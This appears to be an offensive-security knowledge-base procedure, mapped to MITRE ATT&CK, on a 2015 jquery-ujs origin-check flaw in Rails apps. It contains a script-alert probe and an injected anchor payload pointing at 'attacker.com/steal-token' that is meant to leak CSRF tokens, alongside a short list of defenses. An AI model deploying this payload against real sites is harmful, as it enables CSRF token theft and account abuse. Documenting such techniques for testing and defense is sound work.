---
id: uuid-proc-1
tags:
  - xss
  - html-injection
  - csrf
  - csp-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:15.682Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Malformed-HTML-to-Control-Anchor-or-Form-Attributes

## Summary

This procedure involves injecting arbitrary HTML into a Ruby on Rails application to manipulate anchor or form tag attributes, specifically prefixing URLs with a space to exploit jQuery-UJS's weak origin detection regex, setting the stage for CSRF token theft.

## Description

In vulnerable Rails apps using jquery-ujs and jquery-rails, attackers can inject HTML like an anchor tag with a space-prefixed href (e.g., `href=" https://attacker.com"`) combined with `data-remote` and `data-method="post"`. The space causes jQuery's URL parsing to fail proper cross-origin detection, treating it as same-origin and including the CSRF token in subsequent requests. This is particularly effective in XSS scenarios where CSP blocks inline scripts, as it leverages the framework's own AJAX handling. Discovered in 2015, it requires HTML injection capability but no direct JS execution.

## Requirements

1. Access to an injection point (e.g., reflected/stored XSS or unsanitized input)
2. Target using jquery-ujs < 1.1.0 or jquery-rails < 4.0.1
3. Valid user session on the target for token inclusion
4. Attacker domain ready to receive POSTs with CORS enabled

## Defense

Defensive measures and detection strategies:

- Upgrade to jquery-ujs 1.1.0+ and jquery-rails 4.0.1+ which fix the regex
- Implement strict CSP with 'unsafe-inline' blocked and nonce usage
- Sanitize all user inputs to prevent HTML injection (e.g., via Rails' `sanitize` helper)
- Monitor for anomalous OPTIONS/PREFLIGHT requests to external domains

## Objectives

1. Establish control over dynamic tag attributes to prepare for token exfiltration
2. Avoid CSP blocks by not using inline JS
3. Position for user-triggered cross-origin request with token

## Instructions

### Step 1: Identify Injection Point

**Context**: Locate a vulnerability allowing HTML insertion, such as a comment field or profile bio that echoes input without proper escaping.

Test by submitting `<script>alert(1)</script>`; if blocked by CSP, proceed to HTML-only injection.

### Step 2: Craft and Inject Malicious HTML

**Context**: Create HTML that mimics a legitimate remote link but with malformed URL to trick origin checks.

Inject the following via the vulnerable input:

```html
<a href=" https://attacker.com/steal-token" data-remote="true" data-method="post" data-cross-domain="false">Click for update</a>
```

The `data-cross-domain="false"` forces token inclusion assuming same-origin. Submit and verify the HTML renders in the response.

### Step 3: Validate Injection

**Context**: Confirm the tag is present and attributes are preserved.

Inspect the page source or use browser dev tools to check for the exact href with leading space and data attributes intact.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[xss]]
- [[html-injection]]
- [[csrf]]
- [[csp-bypass]]
